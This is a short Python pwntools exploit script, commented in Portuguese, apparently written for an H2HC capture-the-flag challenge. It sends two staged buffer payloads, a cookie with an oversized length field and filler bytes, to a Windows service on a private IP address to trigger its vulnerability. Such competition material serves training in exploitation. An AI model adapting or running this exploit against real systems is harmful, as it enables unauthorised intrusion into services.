#!/Library/Frameworks/Python.framework/Versions/2.7/bin/python
# -*- coding: utf-8 -*-
'''
Aplicação H2HC criado para CTF
Exploit criado por M4v3r1ck (helvio_junior[at]hotmail[dot]com)
'''

from pwn import *
import os
 
context(arch='amd64', os='windows', log_level='debug')

host= "192.168.255.201"
port = 54345

# Estágio 1
log.info("Enviando estágio 1")
payload1  = "H2HC" #cookie 
payload1 += "\xff\x00\x00\x00" #size to trigger the vul
payload1 += "\x41" * 0xff
payload1 += "\n"

p = remote(host, port)
p.send(payload1)
p.recv(4096)
p.close()

# Estágio 2
log.info("Enviando estágio 2")
payload2  = "H2HC" 
payload2 += "\xff\x00\x00\x00" 
payload2 += "A" * 0x100
payload2 += "\x04\x09\x00\x00" 


p2 = remote(host, port)
p2.send(payload2)
p2.recv(40960)
p2.close()

